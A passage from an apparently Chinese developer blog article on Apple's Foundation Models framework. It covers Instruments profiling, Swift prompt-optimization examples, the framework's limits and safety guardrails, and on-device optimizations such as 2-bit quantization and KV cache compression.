- 识别性能瓶颈和优化点<br/>
- 优化建议：精简 Prompt、优化 Instructions</p>
</li>
<li>
<p><strong>输入令牌数量（Input Token Count）</strong><br/>
- 统计每次请求的输入令牌总数<br/>
- 帮助优化输入长度，减少成本<br/>
- 优化建议：精简上下文、使用摘要</p>
</li>
<li>
<p><strong>内存使用（Memory Usage）</strong><br/>
- 监控模型运行时的内存占用<br/>
- 识别内存泄漏和峰值使用<br/>
- 优化建议：及时释放 Session、管理上下文窗口</p>
</li>
</ol>
<h5 data-id="heading-70">使用步骤</h5>
<p><strong>步骤1: 打开 Instruments</strong></p>
<ol>
<li>在 Xcode 中，选择 <strong>Product → Profile</strong>（或按 <code>⌘I</code>）</li>
<li>选择 <strong>Foundation Models</strong> 模板</li>
<li>选择目标设备（必须是支持 Apple Intelligence 的真实设备）</li>
</ol>
<p><strong>步骤2: 配置分析选项</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR  
    Config[配置分析选项] --&gt; Option1[模型加载时间追踪]  
    Config --&gt; Option2[推理时间追踪]  
    Config --&gt; Option3[令牌计数追踪]  
    Config --&gt; Option4[内存使用追踪]  
      
    Option1 --&gt; Start[开始录制]  
    Option2 --&gt; Start  
    Option3 --&gt; Start  
    Option4 --&gt; Start  
      
    style Config fill:#007AFF,color:#fff  
    style Option1 fill:#5AC8FA,color:#000  
    style Option2 fill:#5AC8FA,color:#000  
    style Option3 fill:#5AC8FA,color:#000  
    style Option4 fill:#5AC8FA,color:#000  
    style Start fill:#34C759,color:#fff  
</code></pre>
<p><strong>步骤3: 执行操作并分析</strong></p>
<p>在应用中使用 Foundation Models 功能，Instruments 会自动记录：</p>
<ul>
<li>每次 <code>LanguageModelSession.respond()</code> 调用的时间线</li>
<li>模型加载事件和耗时</li>
<li>输入令牌数量统计</li>
<li>内存分配和释放情况</li>
</ul>
<p><strong>步骤4: 查看分析结果</strong></p>
<p>Instruments 会显示以下视图：</p>
<ul>
<li><strong>时间线视图</strong>: 显示模型加载和推理的时间分布</li>
<li><strong>统计视图</strong>: 显示平均/最大/最小推理时间</li>
<li><strong>令牌统计</strong>: 显示输入令牌数量分布</li>
<li><strong>内存视图</strong>: 显示内存使用趋势</li>
</ul>
<h5 data-id="heading-71">性能优化实践示例</h5>
<p><strong>场景1: 优化首次调用延迟</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 在 Instruments 中观察模型加载时间  </span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PhotoAnalysisService</span> {  
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">analyzePhoto</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">PhotoDescription</span> {  
        <span class="hljs-comment">// Instruments 会记录这里的模型加载时间  </span>
        <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
          
        <span class="hljs-comment">// 如果加载时间过长，考虑预热  </span>
        <span class="hljs-comment">// 在应用启动时提前加载模型  </span>
        <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
            to: <span class="hljs-type">Prompt</span>(<span class="hljs-string">"分析照片"</span>),  
            generating: <span class="hljs-type">PhotoDescription</span>.<span class="hljs-keyword">self</span>  
        )  
        <span class="hljs-keyword">return</span> response.content  
    }  
}  
</code></pre>
<p><strong>优化建议</strong>:</p>
<ul>
<li>如果 Instruments 显示首次调用延迟 &gt; 2秒，考虑在应用启动时预热模型</li>
<li>使用 <code>ModelPrewarmer</code> 在后台预热，避免用户首次使用时等待</li>
</ul>
<p><strong>场景2: 优化 Prompt 长度</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 在 Instruments 中观察输入令牌数量  </span>
<span class="hljs-keyword">func</span> <span class="hljs-title function_">analyzePhotoWithMetadata</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">photo</span>: <span class="hljs-type">Photo</span>) <span class="hljs-keyword">async</span> <span class="hljs-keyword">throws</span> -&gt; <span class="hljs-type">PhotoDescription</span> {  
    <span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>()  
      
    <span class="hljs-comment">// ❌ 不好的做法：包含过多元数据，令牌数量过多  </span>
    <span class="hljs-keyword">let</span> longPrompt <span class="hljs-operator">=</span> <span class="hljs-string">"""  
        分析照片：  
        - 拍摄时间: <span class="hljs-subst">\(photo.date)</span>  
        - 拍摄地点: <span class="hljs-subst">\(photo.location <span class="hljs-operator">??</span> <span class="hljs-string">"未知"</span>)</span>  
        - EXIF信息: <span class="hljs-subst">\(photo.exifInfo)</span>  
        - 文件大小: <span class="hljs-subst">\(photo.fileSize)</span>MB  
        - 分辨率: <span class="hljs-subst">\(photo.resolution)</span>  
        - 相机型号: <span class="hljs-subst">\(photo.cameraModel)</span>  
        - ISO: <span class="hljs-subst">\(photo.iso)</span>  
        - 光圈: <span class="hljs-subst">\(photo.aperture)</span>  
        - 快门速度: <span class="hljs-subst">\(photo.shutterSpeed)</span>  
        ... 更多元数据  
    """</span>  
      
    <span class="hljs-comment">// ✅ 好的做法：只包含关键信息，减少令牌数量  </span>
    <span class="hljs-keyword">let</span> optimizedPrompt <span class="hljs-operator">=</span> <span class="hljs-string">"""  
        分析照片：  
        - 时间: <span class="hljs-subst">\(photo.date)</span>  
        - 地点: <span class="hljs-subst">\(photo.location <span class="hljs-operator">??</span> <span class="hljs-string">"未知"</span>)</span>  
        - 关键信息: <span class="hljs-subst">\(photo.keyMetadata)</span>  
    """</span>  
      
    <span class="hljs-keyword">let</span> response <span class="hljs-operator">=</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> session.respond(  
        to: <span class="hljs-type">Prompt</span>(optimizedPrompt),  
        generating: <span class="hljs-type">PhotoDescription</span>.<span class="hljs-keyword">self</span>  
    )  
    <span class="hljs-keyword">return</span> response.content  
}  
</code></pre>
<p><strong>优化建议</strong>:</p>
<ul>
<li>使用 Instruments 监控输入令牌数量</li>
<li>如果平均令牌数量 &gt; 1000，考虑精简 Prompt</li>
<li>移除不必要的元数据，只保留关键信息</li>
</ul>
<p><strong>场景3: 识别性能瓶颈</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD  
    Profile[使用 Instruments 分析] --&gt; Check1{模型加载时间&lt;br/&gt;是否过长?}  
    Check1 --&gt;|是| Action1[预热模型&lt;br/&gt;优化加载策略]  
    Check1 --&gt;|否| Check2{推理时间&lt;br/&gt;是否过长?}  
      
    Check2 --&gt;|是| Action2[精简 Prompt&lt;br/&gt;优化 Instructions]  
    Check2 --&gt;|否| Check3{令牌数量&lt;br/&gt;是否过多?}  
      
    Check3 --&gt;|是| Action3[减少上下文&lt;br/&gt;使用摘要]  
    Check3 --&gt;|否| Check4{内存使用&lt;br/&gt;是否异常?}  
      
    Check4 --&gt;|是| Action4[管理上下文窗口&lt;br/&gt;及时释放 Session]  
    Check4 --&gt;|否| Success[性能优化完成]  
      
    Action1 --&gt; Success  
    Action2 --&gt; Success  
    Action3 --&gt; Success  
    Action4 --&gt; Success  
      
    style Profile fill:#007AFF,color:#fff  
    style Check1 fill:#FF9500,color:#fff  
    style Check2 fill:#FF9500,color:#fff  
    style Check3 fill:#FF9500,color:#fff  
    style Check4 fill:#FF9500,color:#fff  
    style Action1 fill:#34C759,color:#fff  
    style Action2 fill:#34C759,color:#fff  
    style Action3 fill:#34C759,color:#fff  
    style Action4 fill:#34C759,color:#fff  
    style Success fill:#007AFF,color:#fff  
</code></pre>
<h5 data-id="heading-72">Instruments 分析最佳实践</h5>
<p><strong>1. 建立性能基准</strong></p>
<p>在优化前，先建立性能基准：</p>
<ul>
<li>记录首次调用延迟</li>
<li>记录平均推理时间</li>
<li>记录典型场景的令牌数量</li>
<li>记录峰值内存使用</li>
</ul>
<p><strong>2. 对比优化效果</strong></p>
<p>每次优化后，使用 Instruments 对比：</p>
<ul>
<li>优化前后的时间对比</li>
<li>令牌数量变化</li>
<li>内存使用改善</li>
</ul>
<p><strong>3. 关注关键路径</strong></p>
<p>重点关注用户感知明显的路径：</p>
<ul>
<li>首次调用延迟（影响第一印象）</li>
<li>常见操作的推理时间（影响日常体验）</li>
<li>峰值内存使用（影响稳定性）</li>
</ul>
<p><strong>4. 真实设备测试</strong></p>
<p>⚠️ <strong>重要</strong>: Foundation Models 在模拟器上不可用，必须在真实设备上使用 Instruments 分析。</p>
<p><strong>参考资源</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fdocumentation%2Fxcode%2Finstruments" target="_blank" title="https://developer.apple.com/documentation/xcode/instruments" ref="nofollow noopener noreferrer">Apple Developer - Instruments</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fzvayivqt0ufji%2Farticle%2Fdetails%2F149374995" target="_blank" title="https://blog.csdn.net/zvayivqt0ufji/article/details/149374995" ref="nofollow noopener noreferrer">CSDN - Foundation Models 性能分析</a></li>
</ul>
<h3 data-id="heading-73">4.3 Foundation Models 的边界和限制</h3>
<p>了解 Foundation Models 的边界和限制，对于在实际项目中使用至关重要。本节基于实际测试数据，帮助你理解框架的能力边界。</p>
<h4 data-id="heading-74">核心限制汇总</h4>



































<table><thead><tr><th>类别</th><th>限制/特征</th><th>详细说明</th></tr></thead><tbody><tr><td><strong>上下文窗口</strong></td><td>4096 tokens</td><td>• 实际限制：4096 tokens（不是训练时的 65K）<br/>• 约支持 10-20 轮对话<br/>• 需要设计上下文管理策略</td></tr><tr><td><strong>内存消耗</strong></td><td>1.0-1.5GB</td><td>• 模型权重：~750MB（3B 参数 × 2-bit 量化）<br/>• KV Cache：~300-600MB（8-bit 量化，37.5% 减少优化）<br/>• 框架开销：~100-200MB</td></tr><tr><td><strong>并发性能</strong></td><td>单 session 正常</td><td>• 单 session：iPhone 10-30 tokens/s，M2 Pro ~30 tokens/s<br/>• 多 session：每个 session 降至约 1 token/s<br/>• <strong>建议</strong>：使用队列串行访问，避免并发 session</td></tr><tr><td><strong>结构化生成</strong></td><td>Schema 开销</td><td>• 每个 <code>@Generable</code> 属性约增加 30 tokens<br/>• 设计复杂数据结构时需要考虑开销<br/>• 影响上下文窗口使用</td></tr><tr><td><strong>适用场景</strong></td><td>文本处理为主</td><td><strong>✅ 适合</strong>：文本摘要、内容分类、结构化提取、自然语言理解<br/><strong>❌ 不适合</strong>：数学计算、代码生成、复杂推理、最新信息（训练数据截止 2023年10月）</td></tr></tbody></table>
<h4 data-id="heading-75">适用场景与不适用场景</h4>
<p><strong>✅ 适合的场景</strong>:</p>
<p>根据实际测试，Foundation Models 在以下场景表现不错：</p>
<ul>
<li><strong>文本摘要</strong>: 生成内容摘要、提取关键信息</li>
<li><strong>内容分类</strong>: 对文本、照片等内容进行分类</li>
<li><strong>结构化数据提取</strong>: 从非结构化文本中提取结构化信息</li>
<li><strong>自然语言理解</strong>: 理解用户意图、解析查询</li>
</ul>
<p><strong>❌ 不适合的场景</strong>:</p>
<ul>
<li><strong>数学计算</strong>: 模型不适合进行精确的数学计算</li>
<li><strong>代码生成</strong>: 代码生成能力有限</li>
<li><strong>复杂推理</strong>: 复杂逻辑推理能力有限</li>
<li><strong>最新信息</strong>: 训练数据截止到 2023 年 10 月，世界知识有限</li>
</ul>
<h4 data-id="heading-76">温度参数敏感性</h4>
<p><strong>测试发现</strong>: 温度参数在 0.0-2.0 范围内表现稳定，意外地不敏感。这意味着你可以在这个范围内调整温度，而不会对输出质量产生显著影响。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 温度参数设置示例  </span>
<span class="hljs-keyword">let</span> session <span class="hljs-operator">=</span> <span class="hljs-type">LanguageModelSession</span>(  
    <span class="hljs-comment">// 温度范围 0.0-2.0 表现稳定  </span>
    <span class="hljs-comment">// 可以根据需要调整，但影响不会很大  </span>
)  
</code></pre>
<h4 data-id="heading-77">安全防护机制</h4>
<p>Foundation Models 内置了相当严格的安全防护机制：</p>
<ul>
<li><strong>内容过滤</strong>: 会删除违规的 transcript 条目</li>
<li><strong>自动清理</strong>: 检测到不当内容时会自动清理对话历史</li>
<li><strong>Guardrail</strong>: 内置安全护栏，防止生成不当内容</li>
</ul>
<p><strong>开发建议</strong>:</p>
<ul>
<li>在设计应用时，要考虑安全机制可能删除部分对话内容</li>
<li>对于敏感场景，需要额外的输入验证和输出检查</li>
<li>不要依赖模型完全阻止不当内容，应用层也需要做防护</li>
</ul>
<h4 data-id="heading-78">Apple Foundation Models 开发流程</h4>
<p>Apple Foundation Models 的开发遵循一个完整的机器学习管道，从数据收集到最终部署：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR  
    subgraph Multimodal["多模态 + 多语言处理"]  
        D[Data&lt;br/&gt;数据收集] --&gt; P[Preprocessing&lt;br/&gt;数据预处理]  
        P --&gt; PT[Pre-Training&lt;br/&gt;预训练]  
        PT --&gt; POST[Post-Training&lt;br/&gt;后训练]  
    end  
      
    POST --&gt; OPT[Optimization&lt;br/&gt;模型优化]  
    OPT --&gt; ADAPTERS[Adapters&lt;br/&gt;适配器层]  
    ADAPTERS --&gt; FM[Apple Foundation Models&lt;br/&gt;基础模型]  
      
    style D fill:#4A90E2,color:#fff  
    style P fill:#9B59B6,color:#fff  
    style PT fill:#E91E63,color:#fff  
    style POST fill:#F39C12,color:#fff  
    style OPT fill:#FF9800,color:#fff  
    style ADAPTERS fill:#3498DB,color:#fff  
    style FM fill:#2ECC71,color:#fff  
</code></pre>
<p><strong>流程阶段详解</strong>：</p>
<h5 data-id="heading-79">1. Data（数据收集）</h5>
<ul>
<li><strong>作用</strong>: 收集用于训练模型的数据集</li>
<li><strong>特点</strong>: 多模态（文本、图像、音频等）和多语言数据</li>
<li><strong>重要性</strong>: 数据质量直接影响模型性能</li>
</ul>
<h5 data-id="heading-80">2. Preprocessing（数据预处理）</h5>
<ul>
<li><strong>作用</strong>: 清洗、标准化和准备训练数据</li>
<li><strong>任务</strong>: <br/>
- 数据清洗（去除噪声、错误数据）<br/>
- 数据标注（为监督学习准备标签）<br/>
- 数据格式转换（统一数据格式）<br/>
- 多语言处理（处理不同语言的数据）</li>
</ul>
<h5 data-id="heading-81">3. Pre-Training（预训练）</h5>
<ul>
<li><strong>作用</strong>: 在大规模无标注数据上进行自监督学习</li>
<li><strong>目标</strong>: 让模型学习通用的语言表示和知识</li>
<li><strong>特点</strong>: <br/>
- 使用大量文本数据<br/>
- 学习语言的基本规律和模式<br/>
- 建立基础的语义理解能力</li>
</ul>
<h5 data-id="heading-82">4. Post-Training（后训练）</h5>
<ul>
<li><strong>作用</strong>: 在预训练基础上进行进一步优化</li>
<li><strong>任务</strong>:<br/>
- 指令微调（Instruction Tuning）<br/>
- 对齐训练（Alignment Training）<br/>
- 安全训练（Safety Training）<br/>
- 评估和验证模型性能</li>
</ul>
<h5 data-id="heading-83">5. Optimization（模型优化）</h5>
<ul>
<li><strong>作用</strong>: 针对设备端部署进行优化</li>
<li><strong>优化技术</strong>（详见下一节）:<br/>
- 2-bit 量化<br/>
- 推测解码和草稿模型<br/>
- 约束解码<br/>
- KV Cache 优化</li>
<li><strong>目标</strong>: 在保持模型质量的同时，减少存储和内存需求</li>
</ul>
<h5 data-id="heading-84">6. Adapters（适配器层）</h5>
<ul>
<li><strong>作用</strong>: 提供特定任务或领域的适配接口</li>
<li><strong>特点</strong>: <br/>
- 多个适配器可以连接到同一个基础模型<br/>
- 每个适配器针对不同的使用场景<br/>
- 允许在不修改基础模型的情况下扩展功能</li>
</ul>
<h5 data-id="heading-85">7. Apple Foundation Models（基础模型）</h5>
<ul>
<li><strong>作用</strong>: 最终部署的设备端模型</li>
<li><strong>特点</strong>:<br/>
- 通过适配器层访问<br/>
- 优化后的模型，适合设备端运行<br/>
- 支持多种任务和应用场景</li>
</ul>
<p><strong>核心原则</strong>：</p>
<blockquote>
<p><strong>Responsible AI principles inform all steps</strong>（负责任 AI 原则贯穿所有步骤）</p>
</blockquote>
<p>这意味着在整个开发流程中，Apple 都遵循负责任 AI 的原则：</p>
<ul>
<li><strong>隐私保护</strong>: 数据收集和处理过程中保护用户隐私</li>
<li><strong>公平性</strong>: 确保模型对不同用户群体公平</li>
<li><strong>透明度</strong>: 公开模型能力和限制</li>
<li><strong>安全性</strong>: 防止模型生成有害内容</li>
<li><strong>可解释性</strong>: 提供模型决策的解释</li>
</ul>
<p><strong>多模态 + 多语言处理</strong>：</p>
<p>前四个阶段（Data → Preprocessing → Pre-Training → Post-Training）被标记为"多模态 + 多语言"，说明：</p>
<ul>
<li><strong>多模态</strong>: 处理文本、图像、音频等多种数据类型</li>
<li><strong>多语言</strong>: 支持多种语言的训练和推理</li>
<li><strong>统一处理</strong>: 在同一个流程中处理不同类型的数据</li>
</ul>
<p><strong>流程关系</strong>：</p>
<pre><code class="hljs">数据收集 → 预处理 → 预训练 → 后训练 → 优化 → 适配器 → 基础模型  
  ↓         ↓        ↓        ↓        ↓       ↓        ↓  
多模态   标准化   学习通用  任务对齐  设备优化  任务适配  最终部署  
多语言   清洗标注  语言表示  安全训练  量化压缩  功能扩展  用户使用  
</code></pre>
<p><strong>实际应用</strong>：</p>
<p>这个流程确保了：</p>
<ol>
<li><strong>高质量</strong>: 通过完整的训练流程保证模型质量</li>
<li><strong>设备兼容</strong>: 通过优化阶段确保能在设备端运行</li>
<li><strong>灵活扩展</strong>: 通过适配器层支持不同应用场景</li>
<li><strong>负责任</strong>: 在整个流程中贯彻 AI 伦理原则</li>
</ol>
<p><strong>📋 官方来源链接</strong>：</p>
<p>该流程图可能来自以下官方资源（建议按顺序查找）：</p>
<ol>
<li>
<p><strong>WWDC 视频和幻灯片</strong>：<br/>
- 🎥 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2024%2F10154%2F" target="_blank" title="https://developer.apple.com/videos/play/wwdc2024/10154/" ref="nofollow noopener noreferrer">Meet the Foundation Models framework</a>（WWDC 2024）<br/>
- 🎥 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fwwdc2024%2F" target="_blank" title="https://developer.apple.com/videos/wwdc2024/" ref="nofollow noopener noreferrer">WWDC 2024 所有 Session</a><br/>
- 🎥 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2F" target="_blank" title="https://developer.apple.com/videos/" ref="nofollow noopener noreferrer">WWDC 2025 相关 Session</a>（如果有）</p>
</li>
<li>
<p><strong>Apple Developer 文档</strong>：<br/>
- 📚 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fdocumentation%2Ffoundationmodels" target="_blank" title="https://developer.apple.com/documentation/foundationmodels" ref="nofollow noopener noreferrer">Foundation Models Framework 文档</a><br/>
- 📚 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fapple-intelligence%2Fresources%2F" target="_blank" title="https://developer.apple.com/apple-intelligence/resources/" ref="nofollow noopener noreferrer">Apple Intelligence 资源页面</a><br/>
- 📚 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fmachine-learning%2Fwhats-new%2F" target="_blank" title="https://developer.apple.com/machine-learning/whats-new/" ref="nofollow noopener noreferrer">机器学习新功能页面</a></p>
</li>
<li>
<p><strong>Apple 新闻稿和技术报告</strong>：<br/>
- 📰 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.apple.com%2Fnewsroom%2F2025%2F09%2Fapples-foundation-models-framework-unlocks-new-intelligent-app-experiences%2F" target="_blank" title="https://www.apple.com/newsroom/2025/09/apples-foundation-models-framework-unlocks-new-intelligent-app-experiences/" ref="nofollow noopener noreferrer">Apple Foundation Models Framework 新闻稿</a><br/>
- 📄 Apple Intelligence 技术报告（如果已发布）</p>
</li>
<li>
<p><strong>Apple Intelligence 相关页面</strong>：<br/>
- 🌐 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.apple.com%2Fapple-intelligence%2F" target="_blank" title="https://www.apple.com/apple-intelligence/" ref="nofollow noopener noreferrer">Apple Intelligence 官网</a><br/>
- 🌐 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fapple-intelligence%2F" target="_blank" title="https://developer.apple.com/apple-intelligence/" ref="nofollow noopener noreferrer">Apple Developer - Apple Intelligence</a></p>
</li>
</ol>
<p><strong>⚠️ 查找建议</strong>：</p>
<p>如果无法在上述链接中找到确切的流程图，建议：</p>
<ol>
<li>查看 WWDC 2024/2025 相关 Session 的幻灯片（通常在视频页面可下载）</li>
<li>查看 Apple Developer 文档中的图片和图表</li>
<li>查看 Apple Intelligence 技术报告（如果已发布）</li>
<li>在 Apple Developer Forums 中搜索相关讨论</li>
</ol>
<p><strong>💡 提示</strong>：</p>
<ul>
<li>该流程图可能出现在 WWDC 演示的幻灯片中</li>
<li>也可能出现在 Apple Intelligence 的技术报告或白皮书中</li>
<li>如果图片来自第三方技术分析文章，建议标注来源</li>
</ul>
<hr/>
<h4 data-id="heading-86">模型优化技术</h4>
<p>苹果针对设备端场景做了大量优化：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR  
    subgraph Optimization [优化技术]  
        Q1[2-bit 量化 保持质量]  
        Q2[推测解码 Draft Model]  
        Q3[约束解码 结构化输出]  
        Q4[KV Cache优化 8-bit + 37.5%减少]  
    end  
      
    subgraph 效果  
        E1[减少存储]  
        E2[提升速度]  
        E3[保证可靠性]  
        E4[降低内存]  
    end  
      
    Q1 --&gt; E1  
    Q2 --&gt; E2  
    Q3 --&gt; E3  
    Q4 --&gt; E4  
      
    style Q1 fill:#007AFF,color:#fff  
    style Q2 fill:#5AC8FA,color:#000  
    style Q3 fill:#34C759,color:#fff  
    style Q4 fill:#FF9500,color:#fff  
</code></pre>
<p><strong>优化技术详细说明</strong>:</p>
<h5 data-id="heading-87">1. 2-bit 量化（2-bit Quantization）</h5>
<p><strong>技术原理</strong>:</p>
<ul>
<li>将模型权重从传统的 32 位浮点数（FP32）压缩到每权重 2 位（2-bit）</li>
<li>使用<strong>量化感知训练（Quantization-Aware Training, QAT）</strong>，在训练阶段模拟低精度量化的影响</li>
<li>引入可学习的缩放因子（learnable scaling factors），使模型在低精度下仍能保持高质量输出</li>
<li>结合可学习的权重裁剪（learnable weight pruning）和权重初始化方法</li>
</ul>
<p><strong>效果</strong>:</p>
<ul>
<li><strong>存储减少</strong>: 模型权重从 ~12GB（FP32）压缩到 ~750MB（2-bit），压缩比约 <strong>16:1</strong></li>
<li><strong>内存减少</strong>: 运行时内存占用大幅降低</li>
<li><strong>质量保持</strong>: 通过 QAT 训练，模型质量损失最小</li>
</ul>
<p><strong>数据来源</strong>:</p>
<ul>
<li>📰 <strong>技术细节</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Fnews%2F354610%2Fapple-foundation-models-2025-updates" target="_blank" title="https://www.oschina.net/news/354610/apple-foundation-models-2025-updates" ref="nofollow noopener noreferrer">OSCHINA - Apple Foundation Models 2025 更新</a></li>
<li>⚠️ <strong>注意</strong>: Apple 官方文档和 WWDC 视频中未直接提及 2-bit 量化的具体细节，这些信息主要来自第三方技术分析和实际测试</li>
</ul>
<h5 data-id="heading-88">2. 推测解码和草稿模型（Speculative Decoding &amp; Draft Model）</h5>
<p><strong>技术原理</strong>:</p>
<ul>
<li><strong>主模型</strong>: 约 3B 参数的基础语言模型，负责最终输出</li>
<li><strong>草稿模型（Draft Model）</strong>: 约 300M 参数的小型模型，用于快速生成初步预测</li>
<li><strong>工作流程</strong>:<br/>
1. 草稿模型快速生成多个候选 token（推测解码）<br/>
2. 主模型并行验证这些候选 token<br/>
3. 接受符合主模型预测的 token，拒绝不符合的并重新生成<br/>
4. 通过并行验证多个 token，提升整体生成速度</li>
</ul>
<p><strong>效果</strong>:</p>
<ul>
<li><strong>速度提升</strong>: 通过并行验证多个候选 token，推理速度提升约 <strong>2-3 倍</strong></li>
<li><strong>质量保证</strong>: 主模型验证确保输出质量不受影响</li>
<li><strong>资源平衡</strong>: 300M 草稿模型的内存开销相对较小</li>
</ul>
<p><strong>数据来源</strong>:</p>
<ul>
<li>📰 <strong>技术分析</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aigc.bar%2FAI%25E8%25B5%2584%25E8%25AE%25AF%25E6%2596%2587%25E7%25AB%25A0%2F2025%2F08%2F11%2Fapple-ai-foundation-models-ios-26-deep-dive" target="_blank" title="https://www.aigc.bar/AI%E8%B5%84%E8%AE%AF%E6%96%87%E7%AB%A0/2025/08/11/apple-ai-foundation-models-ios-26-deep-dive" ref="nofollow noopener noreferrer">AIGC.Bar - iOS 26 大模型技术深度解析</a></li>
<li>⚠️ <strong>注意</strong>: 3B 和 300M 的具体参数数量来自第三方分析，Apple 官方未明确公布模型参数规模</li>
</ul>
<h5 data-id="heading-89">3. 约束解码（Constrained Decoding）</h5>
<p><strong>技术原理</strong>:</p>
<ul>
<li>在生成过程中施加特定的结构约束，确保输出符合预期格式</li>
<li>Apple 通过 <strong>引导生成（Guided Generation）</strong> 实现约束解码</li>
<li>开发者使用 <code>@Generable</code> 宏和 <code>@Guide</code> 注解定义输出结构</li>
<li>模型在生成时遵循这些结构约束，生成符合 Swift 数据类型的输出</li>
</ul>
<p><strong>实现方式</strong>:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@Generable</span>  
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">PhotoAnalysis</span> {  
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"照片的主题"</span>)  
    <span class="hljs-keyword">let</span> subject: <span class="hljs-type">String</span>  
      
    <span class="hljs-meta">@Guide</span>(description: <span class="hljs-string">"质量评分，1-10分"</span>)  
    <span class="hljs-keyword">let</span> qualityScore: <span class="hljs-type">Int</span>  
}  
</code></pre>
<p><strong>效果</strong>:</p>
<ul>
<li><strong>可靠性</strong>: 确保输出始终符合定义的结构</li>
<li><strong>类型安全</strong>: 直接生成 Swift 类型，无需手动解析 JSON</li>
<li><strong>开发效率</strong>: 减少错误处理和类型转换代码</li>
</ul>
<p><strong>数据来源</strong>:</p>
<ul>
<li>📚 <strong>官方文档</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fdocumentation%2Ffoundationmodels" target="_blank" title="https://developer.apple.com/documentation/foundationmodels" ref="nofollow noopener noreferrer">Apple Developer - Foundation Models</a></li>
<li>🎥 <strong>WWDC 视频</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fvideos%2Fplay%2Fwwdc2024%2F10154%2F" target="_blank" title="https://developer.apple.com/videos/play/wwdc2024/10154/" ref="nofollow noopener noreferrer">Meet the Foundation Models framework</a>（WWDC 2024）</li>
<li>📰 <strong>技术更新</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Fnews%2F354610%2Fapple-foundation-models-2025-updates" target="_blank" title="https://www.oschina.net/news/354610/apple-foundation-models-2025-updates" ref="nofollow noopener noreferrer">OSCHINA - Apple Foundation Models 2025 更新</a></li>
</ul>
<h5 data-id="heading-90">4. KV Cache 优化（KV Cache Optimization）</h5>
<p><strong>技术原理</strong>:</p>
<ul>
<li><strong>KV Cache</strong>: 存储注意力机制中的键（Key）和值（Value），避免重复计算</li>
<li><strong>8-bit 量化</strong>: 将 KV Cache 从 FP32 压缩到 8-bit 整数</li>
<li><strong>Block Sharing</strong>: 通过块共享技术，减少 37.5% 的 KV Cache 存储需求</li>
<li><strong>优化效果</strong>: 内存占用从理论上的 ~1.2GB 降低到实际的 ~300-600MB</li>
</ul>
<p><strong>内存占用对比</strong>:</p>





























<table><thead><tr><th>组件</th><th>未优化</th><th>优化后</th><th>说明</th></tr></thead><tbody><tr><td>模型权重</td><td>~12GB (FP32)</td><td>~750MB (2-bit)</td><td>2-bit 量化</td></tr><tr><td>KV Cache</td><td>~1.2GB (FP32)</td><td>~300-600MB (8-bit + block sharing)</td><td>8-bit 量化 + 37.5% 减少</td></tr><tr><td><strong>总计</strong></td><td><strong>~13.2GB</strong></td><td><strong>~1.0-1.5GB</strong></td><td><strong>显著降低</strong></td></tr></tbody></table>
<p><strong>效果</strong>:</p>
<ul>
<li><strong>内存降低</strong>: KV Cache 内存占用减少约 <strong>50-75%</strong></li>
<li><strong>性能保持</strong>: 推理速度不受影响</li>
<li><strong>设备兼容</strong>: 使得模型能在 iPhone 15 Pro 等设备上运行</li>
</ul>
<p><strong>数据来源</strong>:</p>
<ul>
<li>📊 <strong>主要来源</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fonevcat.com%2F2025%2F06%2Ffoundation-models%2F" target="_blank" title="https://onevcat.com/2025/06/foundation-models/" ref="nofollow noopener noreferrer">OneV's Den - Foundation Models 边界探索</a>（基于实际测试和 Instruments 分析）</li>
<li>⚠️ <strong>注意</strong>: 37.5% block sharing 减少的具体数值来自实际测试分析，Apple 官方未明确公布此优化细节</li>
</ul>
<hr/>
<p><strong>📋 数据来源总结</strong>:</p>



































